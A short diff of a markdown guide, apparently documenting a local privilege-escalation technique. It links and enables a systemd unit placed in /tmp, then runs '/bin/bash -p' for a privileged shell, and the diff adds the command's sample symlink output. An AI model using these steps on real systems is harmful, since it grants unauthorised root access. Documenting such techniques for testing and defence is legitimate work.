@@ -146,6 +146,8 @@ WantedBy=multi-user.target' > $TF
 
 /bin/systemctl link $TF
 /bin/systemctl enable --now $TF
+*Created symlink from /etc/systemd/system/tmp.xDvXw9w2JX.service to /tmp/tmp.xDvXw9w2JX.service.*
+
 ```
 	After running this, execute:
 	`/bin/bash -p`
